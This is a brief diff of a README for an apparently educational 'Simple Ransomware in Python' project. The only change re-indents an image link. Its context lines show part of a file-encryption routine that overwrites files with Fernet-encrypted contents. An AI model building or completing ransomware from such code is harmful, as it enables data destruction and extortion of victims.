@@ -51,7 +51,8 @@ This project, **Simple Ransomware in Python**, is designed for educational purpo
      encrypted_contents = Fernet(key).encrypt(contents)
      open(file, "wb").write(encrypted_contents)
 ```
-![Ransomware Attack](malware.png)
+   
+  ![Ransomware Attack](malware.png)
 
 
 ### Decryption Process:
